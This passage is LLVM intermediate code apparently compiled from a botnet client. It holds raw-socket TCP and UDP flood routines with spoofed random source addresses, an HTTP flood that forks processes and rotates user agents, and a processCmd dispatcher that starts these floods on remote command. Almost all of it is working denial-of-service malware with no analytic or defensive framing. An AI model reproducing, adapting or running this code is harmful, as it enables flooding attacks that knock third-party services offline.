  %177 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -1025
  %180 = or i16 %179, 1024
  store i16 %180, i16* %177, align 4
  br label %221

; <label>:181:                                    ; preds = %169
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0)) #9
  %184 = icmp ne i32 %183, 0
  br i1 %184, label %193, label %185

; <label>:185:                                    ; preds = %181
  %186 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon* %187 to %struct.anon.0*
  %189 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -257
  %192 = or i16 %191, 256
  store i16 %192, i16* %189, align 4
  br label %220

; <label>:193:                                    ; preds = %181
  %194 = load i8*, i8** %23, align 8
  %195 = call i32 @strcmp(i8* %194, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #9
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %205, label %197

; <label>:197:                                    ; preds = %193
  %198 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon* %199 to %struct.anon.0*
  %201 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -4097
  %204 = or i16 %203, 4096
  store i16 %204, i16* %201, align 4
  br label %219

; <label>:205:                                    ; preds = %193
  %206 = load i8*, i8** %23, align 8
  %207 = call i32 @strcmp(i8* %206, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #9
  %208 = icmp ne i32 %207, 0
  br i1 %208, label %217, label %209

; <label>:209:                                    ; preds = %205
  %210 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon* %211 to %struct.anon.0*
  %213 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %214, -2049
  %216 = or i16 %215, 2048
  store i16 %216, i16* %213, align 4
  br label %218

; <label>:217:                                    ; preds = %205
  br label %218

; <label>:218:                                    ; preds = %217, %209
  br label %219

; <label>:219:                                    ; preds = %218, %197
  br label %220

; <label>:220:                                    ; preds = %219, %185
  br label %221

; <label>:221:                                    ; preds = %220, %173
  br label %222

; <label>:222:                                    ; preds = %221, %161
  %223 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %223, i8** %23, align 8
  br label %154

; <label>:224:                                    ; preds = %154
  br label %225

; <label>:225:                                    ; preds = %224, %115
  %226 = call i32 @rand_cmwc()
  %227 = trunc i32 %226 to i16
  %228 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = bitcast %union.anon* %229 to %struct.anon.0*
  %231 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %230, i32 0, i32 5
  store i16 %227, i16* %231, align 2
  %232 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon* %233 to %struct.anon.0*
  %235 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %234, i32 0, i32 6
  store i16 0, i16* %235, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load i32, i32* %9, align 4
  %241 = icmp eq i32 %240, 0
  br i1 %241, label %242, label %244

; <label>:242:                                    ; preds = %225
  %243 = call i32 @rand_cmwc()
  br label %249

; <label>:244:                                    ; preds = %225
  %245 = load i32, i32* %9, align 4
  %246 = trunc i32 %245 to i16
  %247 = call zeroext i16 @htons(i16 zeroext %246) #10
  %248 = zext i16 %247 to i32
  br label %249

; <label>:249:                                    ; preds = %244, %242
  %250 = phi i32 [ %243, %242 ], [ %248, %244 ]
  %251 = trunc i32 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon* %253 to %struct.anon.0*
  %255 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %254, i32 0, i32 1
  store i16 %251, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %257 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %258 = call zeroext i16 @tcpcsum(%struct.iphdr* %256, %struct.tcphdr* %257)
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon* %260 to %struct.anon.0*
  %262 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %261, i32 0, i32 6
  store i16 %258, i16* %262, align 4
  %263 = bitcast i8* %73 to i16*
  %264 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 2
  %266 = load i16, i16* %265, align 2
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @csum(i16* %263, i32 %267)
  %269 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = call i64 @time(i64* null) #5
  %272 = load i32, i32* %10, align 4
  %273 = sext i32 %272 to i64
  %274 = add nsw i64 %271, %273
  %275 = trunc i64 %274 to i32
  store i32 %275, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %276

; <label>:276:                                    ; preds = %330, %329, %249
  br label %277

; <label>:277:                                    ; preds = %276
  %278 = load i32, i32* %17, align 4
  %279 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %280 = call i64 @sendto(i32 %278, i8* %73, i64 %71, i32 0, %struct.sockaddr* %279, i32 16)
  %281 = load i32, i32* %19, align 4
  %282 = call i32 @getRandomIP(i32 %281)
  %283 = call i32 @htonl(i32 %282) #10
  %284 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 8
  store i32 %283, i32* %285, align 4
  %286 = call i32 @rand_cmwc()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 3
  store i16 %287, i16* %289, align 4
  %290 = call i32 @rand_cmwc()
  %291 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 0
  %293 = bitcast %union.anon* %292 to %struct.anon.0*
  %294 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %293, i32 0, i32 2
  store i32 %290, i32* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 0
  %299 = bitcast %union.anon* %298 to %struct.anon.0*
  %300 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %299, i32 0, i32 0
  store i16 %296, i16* %300, align 4
  %301 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon* %302 to %struct.anon.0*
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 6
  store i16 0, i16* %304, align 4
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = call zeroext i16 @tcpcsum(%struct.iphdr* %305, %struct.tcphdr* %306)
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon* %309 to %struct.anon.0*
  %311 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %310, i32 0, i32 6
  store i16 %307, i16* %311, align 4
  %312 = bitcast i8* %73 to i16*
  %313 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 2
  %315 = load i16, i16* %314, align 2
  %316 = zext i16 %315 to i32
  %317 = call zeroext i16 @csum(i16* %312, i32 %316)
  %318 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 7
  store i16 %317, i16* %319, align 2
  %320 = load i32, i32* %25, align 4
  %321 = load i32, i32* %15, align 4
  %322 = icmp eq i32 %320, %321
  br i1 %322, label %323, label %330

; <label>:323:                                    ; preds = %277
  %324 = call i64 @time(i64* null) #5
  %325 = load i32, i32* %24, align 4
  %326 = sext i32 %325 to i64
  %327 = icmp sgt i64 %324, %326
  br i1 %327, label %328, label %329

; <label>:328:                                    ; preds = %323
  br label %333

; <label>:329:                                    ; preds = %323
  store i32 0, i32* %25, align 4
  br label %276

; <label>:330:                                    ; preds = %277
  %331 = load i32, i32* %25, align 4
  %332 = add i32 %331, 1
  store i32 %332, i32* %25, align 4
  br label %276

; <label>:333:                                    ; preds = %328
  %334 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %334)
  br label %335

; <label>:335:                                    ; preds = %333, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %67, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %70

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #5
  %34 = srem i32 %33, 59
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.110, i32 0, i32 0), i8* %30, i8* %31, i8* %32, i8* %37) #5
  %39 = call i32 @fork() #5
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %66

; <label>:41:                                     ; preds = %28
  br label %42

; <label>:42:                                     ; preds = %64, %41
  %43 = load i32, i32* %15, align 4
  %44 = sext i32 %43 to i64
  %45 = call i64 @time(i64* null) #5
  %46 = icmp sgt i64 %44, %45
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %64

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* %13, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #9
  %58 = call i64 @write(i32 %54, i8* %55, i64 %57)
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %61 = call i64 @read(i32 %59, i8* %60, i64 1)
  %62 = load i32, i32* %13, align 4
  %63 = call i32 @close(i32 %62)
  br label %64

; <label>:64:                                     ; preds = %53, %47
  br label %42

; <label>:65:                                     ; preds = %42
  call void @exit(i32 0) #12
  unreachable

; <label>:66:                                     ; preds = %28
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %14, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %14, align 4
  br label %24

; <label>:70:                                     ; preds = %24
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @strcmp(i8* %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0)) #9
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %36, label %35

; <label>:35:                                     ; preds = %2
  br label %483

; <label>:36:                                     ; preds = %2
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.112, i32 0, i32 0)) #9
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %85, label %42

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %3, align 4
  %44 = icmp slt i32 %43, 6
  br i1 %44, label %57, label %45

; <label>:45:                                     ; preds = %42
  %46 = load i8**, i8*** %4, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 3
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @atoi(i8* %48) #9
  %50 = icmp slt i32 %49, 1
  br i1 %50, label %57, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i8**, i8*** %4, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 5
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @atoi(i8* %54) #9
  %56 = icmp slt i32 %55, 1
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %51, %45, %42
  br label %483

; <label>:58:                                     ; preds = %51
  %59 = call i32 @listFork()
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  br label %483

; <label>:62:                                     ; preds = %58
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 2
  %68 = load i8*, i8** %67, align 8
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 3
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @atoi(i8* %71) #9
  %73 = trunc i32 %72 to i16
  %74 = load i8**, i8*** %4, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 4
  %76 = load i8*, i8** %75, align 8
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 5
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @atoi(i8* %79) #9
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 6
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @atoi(i8* %83) #9
  call void @SendHTTP(i8* %65, i8* %68, i16 zeroext %73, i8* %76, i32 %80, i32 %84)
  call void @exit(i32 0) #12
  unreachable

; <label>:85:                                     ; preds = %36
  %86 = load i8**, i8*** %4, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 0
  %88 = load i8*, i8** %87, align 8
  %89 = call i32 @strcmp(i8* %88, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i32 0, i32 0)) #9
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %188, label %91

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* %3, align 4
  %93 = icmp slt i32 %92, 6
  br i1 %93, label %127, label %94

; <label>:94:                                     ; preds = %91
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 3
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* %97) #9
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %127, label %100

; <label>:100:                                    ; preds = %94
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 2
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @atoi(i8* %103) #9
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %127, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 4
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @atoi(i8* %109) #9
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %127, label %112

; <label>:112:                                    ; preds = %106
  %113 = load i8**, i8*** %4, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 4
  %115 = load i8*, i8** %114, align 8
  %116 = call i32 @atoi(i8* %115) #9
  %117 = icmp sgt i32 %116, 1024
  br i1 %117, label %127, label %118

; <label>:118:                                    ; preds = %112
  %119 = load i32, i32* %3, align 4
  %120 = icmp eq i32 %119, 6
  br i1 %120, label %121, label %128

; <label>:121:                                    ; preds = %118
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 5
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @atoi(i8* %124) #9
  %126 = icmp slt i32 %125, 1
  br i1 %126, label %127, label %128

; <label>:127:                                    ; preds = %121, %112, %106, %100, %94, %91
  br label %483

; <label>:128:                                    ; preds = %121, %118
  %129 = load i8**, i8*** %4, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 1
  %131 = load i8*, i8** %130, align 8
  store i8* %131, i8** %5, align 8
  %132 = load i8**, i8*** %4, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 2
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 @atoi(i8* %134) #9
  store i32 %135, i32* %6, align 4
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 3
  %138 = load i8*, i8** %137, align 8
  %139 = call i32 @atoi(i8* %138) #9
  store i32 %139, i32* %7, align 4
  %140 = load i8**, i8*** %4, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 4
  %142 = load i8*, i8** %141, align 8
  %143 = call i32 @atoi(i8* %142) #9
  store i32 %143, i32* %8, align 4
  %144 = load i32, i32* %3, align 4
  %145 = icmp eq i32 %144, 6
  br i1 %145, label %146, label %151

; <label>:146:                                    ; preds = %128
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 5
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149) #9
  br label %152

; <label>:151:                                    ; preds = %128
  br label %152

; <label>:152:                                    ; preds = %151, %146
  %153 = phi i32 [ %150, %146 ], [ 10, %151 ]
  store i32 %153, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %154 = load i8*, i8** %5, align 8
  %155 = call i8* @strstr(i8* %154, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %156 = icmp ne i8* %155, null
  br i1 %156, label %157, label %176

; <label>:157:                                    ; preds = %152
  %158 = load i8*, i8** %5, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %159, i8** %11, align 8
  br label %160

; <label>:160:                                    ; preds = %173, %157
  %161 = load i8*, i8** %11, align 8
  %162 = icmp ne i8* %161, null
  br i1 %162, label %163, label %175

; <label>:163:                                    ; preds = %160
  %164 = call i32 @listFork()
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %173, label %166

; <label>:166:                                    ; preds = %163
  %167 = load i8*, i8** %11, align 8
  %168 = load i32, i32* %6, align 4
  %169 = load i32, i32* %7, align 4
  %170 = load i32, i32* %8, align 4
  %171 = load i32, i32* %9, align 4
  %172 = load i32, i32* %10, align 4
  call void @SendUDP(i8* %167, i32 %168, i32 %169, i32 %170, i32 %171, i32 %172)
  call void @_exit(i32 0) #11
  unreachable

; <label>:173:                                    ; preds = %163
  %174 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %174, i8** %11, align 8
  br label %160

; <label>:175:                                    ; preds = %160
  br label %187

; <label>:176:                                    ; preds = %152
  %177 = call i32 @listFork()
  %178 = icmp ne i32 %177, 0
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %176
  br label %483

; <label>:180:                                    ; preds = %176
  %181 = load i8*, i8** %5, align 8
  %182 = load i32, i32* %6, align 4
  %183 = load i32, i32* %7, align 4
  %184 = load i32, i32* %8, align 4
  %185 = load i32, i32* %9, align 4
  %186 = load i32, i32* %10, align 4
  call void @SendUDP(i8* %181, i32 %182, i32 %183, i32 %184, i32 %185, i32 %186)
  call void @_exit(i32 0) #11
  unreachable

; <label>:187:                                    ; preds = %175
  br label %188

; <label>:188:                                    ; preds = %187, %85
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 0
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.114, i32 0, i32 0)) #9
  %193 = icmp ne i32 %192, 0
  br i1 %193, label %299, label %194

; <label>:194:                                    ; preds = %188
  %195 = load i32, i32* %3, align 4
  %196 = icmp slt i32 %195, 6
  br i1 %196, label %227, label %197

; <label>:197:                                    ; preds = %194
  %198 = load i8**, i8*** %4, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 3
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 @atoi(i8* %200) #9
  %202 = icmp eq i32 %201, -1
  br i1 %202, label %227, label %203

; <label>:203:                                    ; preds = %197
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 2
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #9
  %208 = icmp eq i32 %207, -1
  br i1 %208, label %227, label %209

; <label>:209:                                    ; preds = %203
  %210 = load i32, i32* %3, align 4
  %211 = icmp sgt i32 %210, 5
  br i1 %211, label %212, label %218

; <label>:212:                                    ; preds = %209
  %213 = load i8**, i8*** %4, align 8
  %214 = getelementptr inbounds i8*, i8** %213, i64 5
  %215 = load i8*, i8** %214, align 8
  %216 = call i32 @atoi(i8* %215) #9
  %217 = icmp slt i32 %216, 0
  br i1 %217, label %227, label %218

; <label>:218:                                    ; preds = %212, %209
  %219 = load i32, i32* %3, align 4
  %220 = icmp eq i32 %219, 7
  br i1 %220, label %221, label %228

; <label>:221:                                    ; preds = %218
  %222 = load i8**, i8*** %4, align 8
  %223 = getelementptr inbounds i8*, i8** %222, i64 6
  %224 = load i8*, i8** %223, align 8
  %225 = call i32 @atoi(i8* %224) #9
  %226 = icmp slt i32 %225, 1
  br i1 %226, label %227, label %228

; <label>:227:                                    ; preds = %221, %212, %203, %197, %194
  br label %483

; <label>:228:                                    ; preds = %221, %218
  %229 = load i8**, i8*** %4, align 8
  %230 = getelementptr inbounds i8*, i8** %229, i64 1
  %231 = load i8*, i8** %230, align 8
  store i8* %231, i8** %12, align 8
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 2
  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #9
  store i32 %235, i32* %13, align 4
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 3
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #9
  store i32 %239, i32* %14, align 4
  %240 = load i8**, i8*** %4, align 8
  %241 = getelementptr inbounds i8*, i8** %240, i64 4
  %242 = load i8*, i8** %241, align 8
  store i8* %242, i8** %15, align 8
